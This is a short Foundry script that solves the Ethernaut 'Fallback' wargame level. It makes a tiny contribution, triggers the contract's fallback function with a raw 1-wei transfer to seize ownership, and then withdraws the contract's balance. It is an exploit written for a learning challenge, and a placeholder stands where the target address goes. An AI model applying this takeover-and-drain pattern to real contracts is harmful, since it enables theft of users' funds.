// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.26;

import "forge-std/Script.sol";
import "../src/Ethernaut Challenge/01_Fallback.sol";

contract ExploitScript is Script {
    Fallback level1 = Fallback(payable(your_challenge_address));

    function run() public {
        vm.startBroadcast();

        level1.contribute{value:0.0001 ether}();
        address(level1).call{value:1 wei}("");
        level1.withdraw();
        
        vm.stopBroadcast();
    }
}